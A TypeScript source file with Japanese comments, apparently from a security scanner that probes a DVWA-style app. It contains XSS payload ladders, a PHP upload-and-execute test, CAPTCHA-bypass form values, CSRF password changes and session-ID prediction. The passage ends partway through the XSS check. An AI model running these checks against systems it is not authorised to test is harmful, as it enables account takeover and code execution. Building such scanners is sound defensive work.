/**
 * ワークフロー診断（明示依頼による実装、2026-10-26）。
 * 複数回の状態遷移・トークン系列分析・暗号データ解析・API操作を必要とする脆弱性
 * （ブルートフォース対策、CSRF、アップロード、CAPTCHA、セッションID生成規則、
 * 反射型/格納型/DOM型XSS、CSP許可元、クライアント側制御、認可不備、オープンリダイレクト、
 * 反復XOR・AES-ECB・CBCパディングオラクル、廃止API、マスアサインメント、API経由の
 * OSコマンドインジェクション、SQLインジェクションのURL単位確認、LFI）を
 * 対象アプリへ直接実行して検出する。AGENTS.md「ベンチマークについて」節のとおり
 * 検証対象専用処理は明示依頼に基づき実装しており、ペイロード集合の版を記録する。
 *
 * 移植元: 旧 C# 実装 main ブランチ `Services/WorkflowScan/**`（docs/work-logs/2026-10-25.md）。
 * HTTP 実行は `WorkflowScanTransport` を介して、core は送信内容を組み立てるだけ
 * （design/22-execution-control: ScopePilot 自身の送信は送信前拒否可能な経路）。
 */
import { createHash } from 'node:crypto';
import { domainError } from '@scopepilot2/contracts';
import {
  WORKFLOW_PAYLOAD_CATALOG,
  WORKFLOW_PAYLOAD_CATALOG_REFERENCE,
  payloadById,
  renderPayload,
  selectPayloads,
} from '@scopepilot2/payloads';

/** ペイロード集合の供給元と版。診断結果と証跡へ必ず記録する。 */
export const WORKFLOW_SCAN_PAYLOAD_SET = WORKFLOW_PAYLOAD_CATALOG_REFERENCE;

/** 1実行あたりの要求数上限。既定は ZAP 能動診断の要求上限と同水準。 */
export const WORKFLOW_SCAN_DEFAULT_MAX_REQUESTS = 2000;

/** 破壊的検証（パスワード・権限変更）の復元試行回数。 */
export const WORKFLOW_SCAN_RESTORE_ATTEMPTS = 2;

// ---------------------------------------------------------------------------
// 輸送契約 — adapters が node の HTTP 実装を提供する
// ---------------------------------------------------------------------------

export interface WorkflowScanFormPart {
  readonly fieldName: string;
  readonly fileName: string;
  readonly contentType: string;
  readonly bytes: Uint8Array;
  readonly fields: Readonly<Record<string, string>>;
}

export interface WorkflowScanRequestSpec {
  readonly method: 'GET' | 'POST' | 'PUT' | 'PATCH';
  /** baseUrl からの相対パス（先頭 /）。 */
  readonly path: string;
  readonly form?: Readonly<Record<string, string>>;
  /** Content-Type: application/json で送る生文字列。 */
  readonly json?: string;
  readonly multipart?: WorkflowScanFormPart;
}

export interface WorkflowScanHttpResponse {
  readonly status: number;
  readonly body: string;
  readonly location: string;
  readonly contentType: string;
  readonly contentSecurityPolicy: string;
  /** Set-Cookie の `name=value` 部分（属性を除く）。 */
  readonly setCookies: readonly string[];
}

/** 証跡用の要求ログ。認証情報等は輸送層で伏せ字済み。 */
export interface WorkflowScanRequestLogEntry {
  readonly method: string;
  readonly url: string;
  readonly status: number;
  readonly location: string;
  readonly requestPreview: string;
  readonly responsePreview: string;
}

export interface WorkflowScanTransport {
  readonly baseUrl: string;
  readonly requestCount: number;
  request(spec: WorkflowScanRequestSpec): Promise<WorkflowScanHttpResponse>;
  /** 蓄積した要求ログを取り出して消す。 */
  takeRequestLog(): WorkflowScanRequestLogEntry[];
}

// ---------------------------------------------------------------------------
// 結果型
// ---------------------------------------------------------------------------

export const WORKFLOW_SCAN_SEVERITIES = ['high', 'medium', 'low', 'info'] as const;
export type WorkflowScanSeverity = (typeof WORKFLOW_SCAN_SEVERITIES)[number];

export interface WorkflowScanCheckResult {
  readonly checkId: string;
  readonly title: string;
  readonly category: string;
  readonly severity: WorkflowScanSeverity;
  readonly cwe: string;
  readonly securityLevel: string;
  readonly url: string;
  readonly method: string;
  readonly param: string;
  readonly description: string;
  readonly evidence: string;
  readonly remediation: string;
  readonly limitations: string;
}

export interface WorkflowScanSkipNote {
  readonly checkId: string;
  readonly securityLevel: string;
  readonly note: string;
}

export interface WorkflowScanRunResult {
  readonly baseUrl: string;
  readonly authenticated: boolean;
  readonly originalSecurityLevel: string;
  readonly testedSecurityLevels: readonly string[];
  readonly requestCount: number;
  readonly startedAt: string;
  readonly endedAt: string;
  readonly payloadSet: string;
  readonly checks: readonly WorkflowScanCheckResult[];
  readonly skips: readonly WorkflowScanSkipNote[];
  /** 認証情報を伏せ字済みの要求証跡。 */
  readonly requestLog: readonly WorkflowScanRequestLogEntry[];
}

export interface WorkflowScanOptions {
  readonly baseUrl: string;
  readonly username: string;
  readonly password: string;
  readonly maxRequests?: number;
  readonly securityLevels?: readonly string[];
  /** 空または未指定なら従来互換で全チェックを実行する。 */
  readonly checkIds?: readonly WorkflowScanCheckId[];
  readonly signal?: AbortSignal;
}

export const WORKFLOW_SCAN_CHECK_IDS = [
  'brute-force',
  'csrf-password',
  'file-upload',
  'captcha-bypass',
  'weak-session',
  'xss-reflected',
  'xss-stored',
  'xss-dom',
  'csp-bypass',
  'client-side-token',
  'authorization-bypass',
  'bac-open-access',
  'open-redirect',
  'crypto-xor',
  'crypto-ecb',
  'crypto-cbc-oracle',
  'api-legacy',
  'api-mass-assignment',
  'api-command-injection',
  'sqli-verify',
  'lfi',
] as const;

export type WorkflowScanCheckId = (typeof WORKFLOW_SCAN_CHECK_IDS)[number];

const ALL_WORKFLOW_CHECKS: readonly WorkflowScanCheckId[] = WORKFLOW_SCAN_CHECK_IDS;
const WEB_TECHNICAL_CHECKS: readonly WorkflowScanCheckId[] = ALL_WORKFLOW_CHECKS;
const DS221_CHECKS: readonly WorkflowScanCheckId[] = [
  'csrf-password',
  'file-upload',
  'weak-session',
  'authorization-bypass',
  'bac-open-access',
  'api-command-injection',
  'crypto-xor',
  'crypto-ecb',
  'crypto-cbc-oracle',
];

/** 選択ガイドラインから、この実装が実行可能なワークフローチェックを決める。 */
export function resolveWorkflowScanCheckIds(guidelines: readonly string[]): readonly WorkflowScanCheckId[] {
  if (guidelines.length === 0) return ALL_WORKFLOW_CHECKS;
  const selected = new Set<WorkflowScanCheckId>();
  for (const guideline of guidelines) {
    const checks = guideline === 'デジタル庁 DS-221' ? DS221_CHECKS : WEB_TECHNICAL_CHECKS;
    for (const check of checks) selected.add(check);
  }
  return ALL_WORKFLOW_CHECKS.filter((check) => selected.has(check));
}

export interface WorkflowScanHooks {
  readonly progress?: (message: string) => void;
  /** パスワード変更の実効性を別セッションで検証するための輸送生成器。 */
  readonly createProbeTransport?: () => WorkflowScanTransport;
}

// ---------------------------------------------------------------------------
// コンテキスト
// ---------------------------------------------------------------------------

interface CheckContext {
  readonly transport: WorkflowScanTransport;
  readonly marker: string;
  readonly securityLevel: string;
  readonly progress: (message: string) => void;
  readonly signal: AbortSignal | undefined;
  readonly results: WorkflowScanCheckResult[];
  readonly skips: WorkflowScanSkipNote[];
  readonly passwordVerifier: ((password: string) => Promise<boolean>) | undefined;
}

function beginCheck(
  ctx: CheckContext,
  input: { checkId: string; title: string; category: string; severity: WorkflowScanSeverity; cwe: string; url: string; method?: string; param?: string },
): PendingCheck {
  return {
    ctx,
    result: {
      checkId: input.checkId,
      title: input.title,
      category: input.category,
      severity: input.severity,
      cwe: input.cwe,
      securityLevel: ctx.securityLevel,
      url: input.url,
      method: input.method ?? 'GET',
      param: input.param ?? '',
      description: '',
      evidence: '',
      remediation: '',
      limitations: '',
    },
  };
}

interface PendingCheck {
  readonly ctx: CheckContext;
  readonly result: Omit<WorkflowScanCheckResult, 'description' | 'evidence' | 'remediation' | 'limitations'> & {
    description: string;
    evidence: string;
    remediation: string;
    limitations: string;
  };
}

function detect(
  check: PendingCheck,
  input: { description: string; evidence: string; remediation: string; limitations?: string },
): void {
  const result: WorkflowScanCheckResult = { ...check.result, ...input, limitations: input.limitations ?? '' };
  check.ctx.results.push(result);
  check.ctx.progress(`検出: ${result.title}`);
}

/** 未検出のチェックも理由付きで実行記録へ残す（網羅性の証跡）。 */
function skip(check: PendingCheck, note: string): void {
  check.ctx.skips.push({ checkId: check.result.checkId, securityLevel: check.ctx.securityLevel, note });
  check.ctx.progress(`未検出: ${check.result.title} (${note})`);
}

function urlOf(ctx: CheckContext, path: string): string {
  return `${ctx.transport.baseUrl.replace(/\/$/, '')}/${path.replace(/^\//, '')}`;
}

async function get(ctx: CheckContext, path: string): Promise<WorkflowScanHttpResponse> {
  return ctx.transport.request({ method: 'GET', path });
}

async function postForm(ctx: CheckContext, path: string, form: Readonly<Record<string, string>>): Promise<WorkflowScanHttpResponse> {
  return ctx.transport.request({ method: 'POST', path, form });
}

async function postJson(ctx: CheckContext, path: string, json: string): Promise<WorkflowScanHttpResponse> {
  return ctx.transport.request({ method: 'POST', path, json });
}

/** 認証が必要な画面への到達確認。リダイレクト（未認証）は実施不可とする。 */
async function reachable(ctx: CheckContext, path: string): Promise<boolean> {
  const response = await get(ctx, path);
  return response.status === 200 && response.status < 300;
}

function throwIfAborted(signal: AbortSignal | undefined): void {
  if (signal?.aborted === true) {
    throw domainError('Cancelled', 'workflow scan aborted');
  }
}

// ---------------------------------------------------------------------------
// 文字列・暗号ユーティリティ（純粋関数、単体テスト対象）
// ---------------------------------------------------------------------------

export function md5Hex(value: string): string {
  return createHash('md5').update(value, 'ascii').digest('hex');
}

export function sha256Hex(value: string): string {
  return createHash('sha256').update(value, 'ascii').digest('hex');
}

export function rot13(value: string): string {
  return value.replace(/[a-zA-Z]/g, (ch) => {
    const lower = ch <= 'Z';
    const base = lower ? 65 : 97;
    return String.fromCharCode(((ch.charCodeAt(0) - base + 13) % 26) + base);
  });
}

export function xorBytes(value: Uint8Array, key: Uint8Array): Uint8Array {
  const output = new Uint8Array(value.length);
  for (let index = 0; index < value.length; index += 1) {
    output[index] = value[index]! ^ key[index % key.length]!;
  }
  return output;
}

/** 既知平文と暗号文の XOR から反復鍵を復元する。周期は32バイトまで、鍵は印刷可能ASCIIのみ。 */
export function detectRepeatingKey(keyStream: Uint8Array): Uint8Array | undefined {
  for (let period = 3; period <= 32 && period <= Math.floor(keyStream.length / 2); period += 1) {
    let ok = true;
    for (let index = period; index < keyStream.length; index += 1) {
      if (keyStream[index] !== keyStream[index % period]) {
        ok = false;
        break;
      }
    }
    if (ok && keyStream.slice(0, period).every((b) => b >= 0x20 && b < 0x7f)) {
      return keyStream.slice(0, period);
    }
  }
  return undefined;
}

export function looksLikeBase64(value: string): boolean {
  if (value.length < 16 || value.includes(' ')) {
    return false;
  }
  try {
    return Buffer.from(value, 'base64').length >= 8;
  } catch {
    return false;
  }
}

export function extractTextareas(html: string): string[] {
  const matches = [...html.matchAll(/<textarea[^>]*>([^<]+)<\/textarea>/gis)];
  return matches.map((m) => m[1]!.trim()).filter((v) => v.length > 0);
}

export function extractHexTokens(html: string): string[] {
  const matches = [...html.matchAll(/>([0-9a-fA-F]{128,256})</g)];
  const values = matches.map((m) => m[1]!.toLowerCase()).filter((v) => v.length % 32 === 0);
  return [...new Set(values)];
}

export function splitBlocks(hexToken: string): string[] {
  const blocks: string[] = [];
  for (let index = 0; index + 32 <= hexToken.length; index += 32) {
    blocks.push(hexToken.slice(index, index + 32));
  }
  return blocks;
}

export function findSharedBlocks(tokenBlocks: readonly string[][]): string[] {
  const seen = new Set<string>();
  const shared = new Set<string>();
  for (const blocks of tokenBlocks) {
    for (const block of blocks) {
      if (seen.has(block)) {
        shared.add(block);
      }
      seen.add(block);
    }
  }
  return [...shared];
}

/** DOM型XSSの疑い: URL由来の値（source）と危険なシンクが同じスクリプト内に存在するか。 */
export function findDomSink(script: string): string | undefined {
  const sourcePattern = /location\.(href|search|hash)|document\.URL|document\.documentURI|decodeURIComponent|decodeURI\(/;
  const sinkPattern = /document\.write|document\.writeln|\.innerHTML|\.insertAdjacentHTML|eval\(|setTimeout\(\s*['"]/;
  if (!sourcePattern.test(script) || !sinkPattern.test(script)) {
    return undefined;
  }
  const line = script
    .split('\n')
    .find((candidate) => sinkPattern.test(candidate))
    ?.trim();
  if (line === undefined) {
    return undefined;
  }
  return line.length > 160 ? `${line.slice(0, 160)}…` : line;
}

export function extractInlineScripts(html: string): string {
  const matches = [...html.matchAll(/<script(?![^>]*\bsrc=)[^>]*>([\s\S]*?)<\/script>/gi)];
  return matches.map((m) => m[1]!).join('\n');
}

/** CSP script-src から 'self' 等のキーワードを除いた外部許可元を列挙する。 */
export function parseExternalScriptOrigins(csp: string): string[] {
  if (csp.trim() === '') {
    return [];
  }
  const directives = csp.split(';').map((d) => d.trim()).filter((d) => d !== '');
  const scriptSrc = directives.find((d) => d.toLowerCase().startsWith('script-src')) ?? '';
  return scriptSrc
    .split(/\s+/)
    .filter((token) => token.includes('://') || (!token.startsWith("'") && token.includes('.')))
    .filter((token) => !token.toLowerCase().startsWith('scopepilot'));
}

/** 配布ロジックと同じ手順でクライアント側トークン候補を生成する（low/medium/high）。 */
export function clientSideTokenCandidates(phrase: string): [string, string, string] {
  const md5 = md5Hex(rot13(phrase));
  const medium = `XX${phrase}XX`.split('').reverse().join('');
  const inner = `XX${phrase.split('').reverse().join('')}`;
  const high = sha256Hex(`${sha256Hex(inner)}ZZ`);
  return [md5, medium, high];
}

export function tryGetHost(location: string): string | undefined {
  if (location.trim() === '') {
    return undefined;
  }
  try {
    return new URL(location).host;
  } catch {
    if (location.startsWith('//')) {
      try {
        return new URL(`https:${location}`).host;
      } catch {
        return undefined;
      }
    }
    return undefined;
  }
}

export function hasResultRow(body: string): boolean {
  return (
    body.includes('First name') ||
    body.includes('Surname') ||
    body.includes('ID: 1') ||
    body.toLowerCase().includes('exists in the database')
  );
}

export function findSensitiveJsonFields(json: string): string[] {
  const fields = ['password', 'passwd', 'pwd', 'secret', 'private_key', 'api_key', 'token'];
  return fields.filter((key) => new RegExp(`"${key}"\\s*:`, 'i').test(json));
}

/** セッションID系列から DVWA の生成規則（連番・現在時刻・連番MD5）を特定する。 */
export function analyzeSessionPattern(values: readonly string[]): { name: string; detail: string } | undefined {
  if (values.every((v) => /^\d+$/.test(v))) {
    const numbers = values.map((v) => Number(v));
    const diffs = numbers.slice(1).map((n, i) => n - numbers[i]!);
    if (diffs.every((d) => d === 1)) {
      return { name: '単純連番', detail: `連続する整数 ${numbers[0]}…${numbers[numbers.length - 1]}（すべて+1）` };
    }
    const now = Math.floor(Date.now() / 1000);
    if (numbers.every((n) => Math.abs(n - now) < 3600)) {
      return { name: '現在時刻', detail: `すべて現在時刻（Unix秒）に一致: ${numbers[0]}…${numbers[numbers.length - 1]}` };
    }
  }
  for (let n = 0; n <= 5000; n += 1) {
    const hash = md5Hex(String(n));
    if (values.includes(hash)) {
      return { name: `連番のMD5（${n}）`, detail: `値 ${hash} は ${n} のMD5ハッシュと一致` };
    }
  }
  return undefined;
}

function truncate(value: string, length: number): string {
  return value.length <= length ? value : `${value.slice(0, length)}…`;
}

// ---------------------------------------------------------------------------
// ログイン・セキュリティレベル
// ---------------------------------------------------------------------------

const USER_TOKEN_PATTERN = /user_token['"]?\s*value=['"]([a-f0-9]{20,64})/;

export async function workflowScanLogin(
  transport: WorkflowScanTransport,
  username: string,
  password: string,
  progress: (message: string) => void,
): Promise<boolean> {
  const loginPage = await transport.request({ method: 'GET', path: 'login.php' });
  if (loginPage.status !== 200) {
    return false;
  }
  const userToken = USER_TOKEN_PATTERN.exec(loginPage.body)?.[1] ?? '';
  const form: Record<string, string> = { username, password, Login: 'Login' };
  if (userToken !== '') {
    form['user_token'] = userToken;
  }
  const response = await transport.request({ method: 'POST', path: 'login.php', form });
  if (response.status === 200 || response.status === 302) {
    const index = await transport.request({ method: 'GET', path: 'index.php' });
    if (index.body.includes('Logout') || index.body.includes('Welcome')) {
      return true;
    }
  }
  progress('ログインを確認できませんでした。未認証の範囲でチェックを続行します。');
  return false;
}

export async function readSecurityLevel(transport: WorkflowScanTransport): Promise<string> {
  const page = await transport.request({ method: 'GET', path: 'security.php' });
  if (page.status !== 200) {
    return '';
  }
  const match =
    /value=["']?(low|medium|high|impossible)["']?[^>]*selected|selected[^>]*value=["']?(low|medium|high|impossible)/.exec(
      page.body,
    );
  return match?.[1] ?? match?.[2] ?? '';
}

export async function setSecurityLevel(transport: WorkflowScanTransport, level: string): Promise<void> {
  const page = await transport.request({ method: 'GET', path: 'security.php' });
  const userToken = USER_TOKEN_PATTERN.exec(page.body)?.[1] ?? '';
  const form: Record<string, string> = { security: level, seclev_submit: 'Submit' };
  if (userToken !== '') {
    form['user_token'] = userToken;
  }
  await transport.request({ method: 'POST', path: 'security.php', form });
}

// ---------------------------------------------------------------------------
// 個別チェック
// ---------------------------------------------------------------------------

/** ブルートフォース対策の欠如 (CWE-307)。 */
export async function runBruteForceCheck(ctx: CheckContext): Promise<void> {
  const check = beginCheck(ctx, {
    checkId: 'brute-force',
    title: `認証試行回数の制限なし（ブルートフォース対策不備）${levelSuffix(ctx.securityLevel)}`,
    category: '認証',
    severity: 'medium',
    cwe: '307',
    url: urlOf(ctx, 'vulnerabilities/brute/'),
    method: 'GET',
    param: 'username/password',
  });
  if (!(await reachable(ctx, 'vulnerabilities/brute/'))) {
    skip(check, '未認証では実施不可');
    return;
  }
  let rejected = 0;
  let blocked = false;
  const invalidPassword = payloadById(WORKFLOW_PAYLOAD_CATALOG, 'auth.invalid-password');
  for (let attempt = 1; attempt <= invalidPassword.safety.maxAttempts; attempt += 1) {
    // 対象フォームのmethodはGETとPOSTの両方があり得るため、クエリ形式で試行する。
    const password = renderPayload(invalidPassword, { marker: ctx.marker, attempt });
    const response = await get(ctx, `vulnerabilities/brute/?username=scopepilot&password=${encodeURIComponent(password)}&Login=Login`);
    const body = response.body;
    // メニュー欄などに「CAPTCHA」という語が出るだけで制限とは判断しない。
    if (response.status === 429 || body.toLowerCase().includes('locked') || body.toLowerCase().includes('too many')) {
      blocked = true;
      break;
    }
    if (body.toLowerCase().includes('incorrect') || body.includes('間違い') || body.includes('失敗')) {
      rejected += 1;
    }
  }
  if (blocked || rejected < 8) {
    skip(check, blocked ? 'ロックアウト等の制限を確認' : '応答から無制限の再試行を確認できず');
    return;
  }
  detect(check, {
    description:
      '誤った認証情報を12回連続で送信しても、すべて同一の再試行可能な応答が返り、アカウントロックアウト・レート制限・CAPTCHA等の試行回数制限が働きませんでした。パスワード推測（ブルートフォース）を自動化したまま継続できます。',
    evidence: `12回連続の誤ログイン試行がすべて拒否応答（Username and/or password incorrect）で受け付けられ、429・ロックアウト・CAPTCHA要求は0回でした（マーカー ${ctx.marker}）。`,
    remediation: '連続認証失敗に対する段階的待ち時間・アカウントロックアウト・多要素認証・IP単位のレート制限を導入し、失敗回数を上限で制御してください。',
    limitations: '不正ログインの成否は確認しておらず、試行回数制限の欠如のみを検出しています。',
  });
}

/** CSRF (CWE-352)。変更後は必ず元のパスワードへ戻す。 */
export async function runCsrfCheck(ctx: CheckContext, knownPassword: string): Promise<void> {
  const check = beginCheck(ctx, {
    checkId: 'csrf-password',
    title: `CSRF：トークンなしでパスワード変更が成立${levelSuffix(ctx.securityLevel)}`,
    category: '認証',
    severity: 'high',
    cwe: '352',
    url: urlOf(ctx, 'vulnerabilities/csrf/'),
    method: 'GET',
    param: 'password_new/password_conf',
  });
  if (!(await reachable(ctx, 'vulnerabilities/csrf/'))) {
    skip(check, '未認証では実施不可');
    return;
  }
  const newPassword = `Sp-${ctx.marker}`;
  // トークン・Referer検証のいずれも通さないGETリクエストで変更を試みる。
  const change = await get(
    ctx,
    `vulnerabilities/csrf/?password_new=${encodeURIComponent(newPassword)}&password_conf=${encodeURIComponent(newPassword)}&Change=Change`,
  );
  if (!change.body.includes('Password Changed')) {
    skip(check, 'トークンなしの変更は拒否');
    return;
  }
  let restoreNote = '';
  if (knownPassword !== '') {
    let restored = false;
    for (let attempt = 0; attempt < WORKFLOW_SCAN_RESTORE_ATTEMPTS && !restored; attempt += 1) {
      const response = await get(
        ctx,
        `vulnerabilities/csrf/?password_new=${encodeURIComponent(knownPassword)}&password_conf=${encodeURIComponent(knownPassword)}&Change=Change`,
      );
      restored = response.body.includes('Password Changed');
    }
    if (!restored && ctx.passwordVerifier !== undefined) {
      restored = await ctx.passwordVerifier(knownPassword);
    }
    restoreNote = restored
      ? '変更後、同じ手順で元のパスワードへ復元しました。'
      : '警告: 元のパスワードへの復元応答を確認できませんでした。手動での復元と再ログインを推奨します。';
  }
  detect(check, {
    description:
      'CSRFトークンも旧パスワードも要求せず、GETパラメーターだけ認証済み利用者のパスワードを変更できました。攻撃者が細工したURLや外部ページを開かせるだけで利用者のアカウントを乗っ取れます。',
    evidence: `GET /vulnerabilities/csrf/?password_new=［伏せ字］&password_conf=［伏せ字］&Change=Change に対し「Password Changed.」応答を確認（マーカー ${ctx.marker}）。${restoreNote}`,
    remediation: 'パスワード変更にはCSRFトークン検証と旧パスワード確認を必須にし、POST以外を受け付けない、SameSite Cookie属性を併用してください。',
    limitations: restoreNote.includes('警告') ? restoreNote : '検証後、パスワードは元の値へ復元しています。',
  });
}

/** 無制限・危険なファイルアップロード (CWE-434)。 */
export async function runFileUploadCheck(ctx: CheckContext): Promise<void> {
  const check = beginCheck(ctx, {
    checkId: 'file-upload',
    title: `制限なしファイルアップロードとアップロードファイルの実行${levelSuffix(ctx.securityLevel)}`,
    category: 'ファイルアップロード',
    severity: 'high',
    cwe: '434',
    url: urlOf(ctx, 'vulnerabilities/upload/'),
    method: 'POST',
    param: 'uploaded',
  });
  if (!(await reachable(ctx, 'vulnerabilities/upload/'))) {
    skip(check, '未認証では実施不可');
    return;
  }
  const fileName = `sp${ctx.marker}.php`;
  const payloadText = `<?php echo "SP-UPLOAD-${ctx.marker}"; ?>`;
  const payloads: { mime: string; bytes: Uint8Array }[] = [
    { mime: 'application/x-php', bytes: new TextEncoder().encode(payloadText) },
    { mime: 'image/jpeg', bytes: new TextEncoder().encode(payloadText) },
    { mime: 'image/jpeg', bytes: new Uint8Array([...new TextEncoder().encode('GIF89a'), ...new TextEncoder().encode(payloadText)]) },
  ];
  let uploadedName: string | undefined;
  for (const payload of payloads) {
    const response = await ctx.transport.request({
      method: 'POST',
      path: 'vulnerabilities/upload/',
      multipart: {
        fieldName: 'uploaded',
        fileName,
        contentType: payload.mime,
        bytes: payload.bytes,
        fields: { MAX_FILE_SIZE: '100000', Upload: 'Upload' },
      },
    });
    if (response.body.includes('succesfully uploaded')) {
      uploadedName = fileName;
      break;
    }
  }
  if (uploadedName === undefined) {
    skip(check, 'アップロードは拒否・制限された');
    return;
  }
  const execution = await get(ctx, `hackable/uploads/${uploadedName}`);
  if (!execution.body.includes(`SP-UPLOAD-${ctx.marker}`)) {
    skip(check, '保存されたがコードとしては実行されず');
    return;
  }
  detect(check, {
    description:
      '拡張子・MIME型・ファイル内容を実質検査せず、PHPスクリプトをアップロードして保存でき、さらにそのURLへアクセスするとサーバー側でコードが実行されました。任意のコード実行（ウェブシェル設置）に直結します。',
    evidence: `multipart/form-data で ${uploadedName}（内容は無害な echo 1行）を送信すると「succesfully uploaded!」となり、GET /hackable/uploads/${uploadedName} の応答本体に実行結果 SP-UPLOAD-${ctx.marker} が現れました。`,
    remediation:
      '拡張子の許可リスト・Content-Type検証・ファイル署名（マジックバイト）検証・保存先の実行権限剥奪・ファイル名の無害化・ウイルス検査を組み合わせ、アップロード後のファイルを直接実行不可能な形で保存・配信してください。',
    limitations: `検証用に無害なPHPファイル ${uploadedName}（echo 1行のみ）が1つアップロードされたまま残ります。削除は可能です。`,
  });
}

/** CAPTCHA・アンチオートメーションの迂回 (CWE-602/489)。 */
export async function runCaptchaBypassCheck(ctx: CheckContext, knownPassword: string): Promise<void> {
  const check = beginCheck(ctx, {
    checkId: 'captcha-bypass',
    title: `CAPTCHA（アンチオートメーション）の迂回${levelSuffix(ctx.securityLevel)}`,
    category: '認証',
    severity: 'medium',
    cwe: '602',
    url: urlOf(ctx, 'vulnerabilities/captcha/'),
    method: 'POST',
    param: 'step/passed_captcha',
  });
  if (!(await reachable(ctx, 'vulnerabilities/captcha/'))) {
    skip(check, '未認証では実施不可');
    return;
  }
  const newPassword = `Sp-${ctx.marker}`;
  const stage2: Record<string, string> = {
    Change: 'Change',
    step: '2',
    password_new: newPassword,
    password_conf: newPassword,
    passed_captcha: 'true',
  };
  // CAPTCHAを解かずに第2段階（確定処理）へ直接POSTする。
  let response = await postForm(ctx, 'vulnerabilities/captcha/', stage2);
  let verified = response.body.includes('Password Changed');
  let verifiedBy = '「Password Changed.」応答';
  // 応答に結果が現れない実装（reCAPTCHAキー未設定で結果表示が置換される等）では、
  // 新しいパスワードで実際にログインできるかによって成立を確認する。
  if (!verified && ctx.passwordVerifier !== undefined && (await ctx.passwordVerifier(newPassword))) {
    verified = true;
    verifiedBy = '別セッションでのログイン検証';
  }
  if (!verified) {
    const dev = { ...stage2, 'g-recaptcha-response': 'DEVELOPER-ONLY' };
    response = await postForm(ctx, 'vulnerabilities/captcha/', dev);
    verified =
      response.body.includes('Password Changed') ||
      (ctx.passwordVerifier !== undefined && (await ctx.passwordVerifier(newPassword)));
    if (verified) {
      verifiedBy = '開発用固定値による迂回';
    }
  }
  const restore = async (): Promise<boolean> => {
    if (knownPassword === '') {
      return false;
    }
    const restoreForms: Record<string, string>[] = [
      {
        Change: 'Change',
        step: '2',
        password_new: knownPassword,
        password_conf: knownPassword,
        passed_captcha: 'true',
      },
      {
        Change: 'Change',
        step: '2',
        password_new: knownPassword,
        password_conf: knownPassword,
        passed_captcha: 'true',
        'g-recaptcha-response': 'DEVELOPER-ONLY',
      },
    ];
    for (const restoreForm of restoreForms) {
      const restoreResponse = await postForm(ctx, 'vulnerabilities/captcha/', restoreForm);
      if (restoreResponse.body.includes('Password Changed')) {
        return true;
      }
    }
    return ctx.passwordVerifier !== undefined && (await ctx.passwordVerifier(knownPassword));
  };
  if (!verified) {
    // 成立を確認できなくても、stage=2 の送信自体がパスワードを変更している実装があるため、
    // 必ず元のパスワードへ戻す措置を取る。
    await restore();
    skip(check, 'CAPTCHAなしの確定は拒否');
    return;
  }
  const restored = await restore();
  const restoreNote = restored
    ? '検証後、パスワードは元の値へ復元しています。'
    : '警告: 元のパスワードへの復元を確認できませんでした。手動での復元と再ログインを推奨します。';
  detect(check, {
    description:
      'CAPTCHAを一度も解かずに、確認段階（step=2）への直接POSTだけでパスワード変更が確定しました。アンチオートメーション制御が最終処理で検証されておらず、自動化した悪用が可能です。',
    evidence: `POST /vulnerabilities/captcha/ （step=2, passed_captcha=true, g-recaptcha-response なし）に対し${verifiedBy}で成立を確認（マーカー ${ctx.marker}）。${restoreNote}`,
    remediation:
      '最終処理のサーバー側でCAPTCHA検証結果を必須にし、段階間の状態はサーバー側セッションで管理し、クライアントから送信される「CAPTCHA通過済み」フラグを信用しないでください。',
    limitations: restoreNote,
  });
}

/** 推測可能なセッションID (CWE-330)。 */
export async function runWeakSessionCheck(ctx: CheckContext): Promise<void> {
  const check = beginCheck(ctx, {
    checkId: 'weak-session',
    title: `推測可能なセッションID（生成規則の特定）${levelSuffix(ctx.securityLevel)}`,
    category: 'セッション管理',
    severity: 'medium',
    cwe: '330',
    url: urlOf(ctx, 'vulnerabilities/weak_id/'),
    method: 'POST',
    param: 'dvwaSession',
  });
  if (!(await reachable(ctx, 'vulnerabilities/weak_id/'))) {
    skip(check, '未認証では実施不可');
    return;
  }
  const values: string[] = [];
  for (let index = 0; index < 5; index += 1) {
    const response = await postForm(ctx, 'vulnerabilities/weak_id/', {});
    const cookie = response.setCookies.find((c) => c.startsWith('dvwaSession='));
    if (cookie === undefined) {
      break;
    }
    values.push(cookie.split('=')[1] ?? '');
  }
  if (values.length < 3) {
    skip(check, 'セッションIDの収集に失敗');
    return;
  }
  const pattern = analyzeSessionPattern(values);
  if (pattern === undefined) {
    skip(check, '生成規則を特定できず');
    return;
  }
  detect(check, {
    description: `発行されたセッションID（dvwaSession）を${values.length}個収集したところ、生成規則が「${pattern.name}」と特定できました。過去・未来の値を推測でき、他利用者のセッション乗っ取りに利用できます。`,
    evidence: `収集値: ${values.map((v) => (v.length > 40 ? `${v.slice(0, 16)}…` : v)).join(', ')}。判定: ${pattern.detail}`,
    remediation: 'セッションIDには十分な長さ（128ビット以上）の暗号論的乱数（CSPRNG）を使用し、連番・時刻・ハッシュ値などの既知情報から生成しないでください。',
    limitations: '収集した値は検証用セッションのもので、他利用者のセッション乗っ取りは行っていません。',
  });
}

const XSS_REFLECTED_LADDERS: readonly { payload: string; needle: string }[] = [
  { payload: '<script>{m}();</script>', needle: '<script>{m}' },
  { payload: '<scr<script>ipt>{m}();</scr</script>ipt>', needle: '<script>{m}' },
  { payload: '<img src=x onerror={m}();>', needle: '<img src=x onerror={m}' },
  { payload: '<svg onload={m}();>', needle: '<svg onload={m}' },
];

/** 反射型XSS (CWE-79)。needle は未エスケープ出力のみに一致させる。 */
export async function runXssReflectedCheck(ctx: CheckContext): Promise<void> {
  const check = beginCheck(ctx, {
    checkId: 'xss-reflected',
    title: `反射型XSS（入力値の未エスケープ出力）${levelSuffix(ctx.securityLevel)}`,
    category: '入力値検証',
    severity: 'high',
    cwe: '79',
    url: urlOf(ctx, 'vulnerabilities/xss_r/'),
    method: 'GET',
    param: 'name',
  });
  if (!(await reachable(ctx, 'vulnerabilities/xss_r/'))) {
    skip(check, '未認証では実施不可');
    return;
  }
  const marker = ctx.marker;
  for (const ladder of XSS_REFLECTED_LADDERS) {
    const payload = ladder.payload.replaceAll('{m}', marker);
    const needle = ladder.needle.replaceAll('{m}', marker);
    const response = await get(ctx, `vulnerabilities/xss_r/?name=${encodeURIComponent(payload)}`);
    if (response.body.includes(needle)) {
      detect(check, {
        description:
          'リクエストパラメーター name の値がHTMLエスケープされずそのまま応答HTMLへ出力されるため、攻撃者の用意したJavaScriptを利用者のブラウザーで実行できます（反射型XSS）。',
        evidence: `GET ?name=<script>…</script>（マーカー ${marker}）の応答本体に、エスケープされていない ${needle} がそのまま出現しました。`,
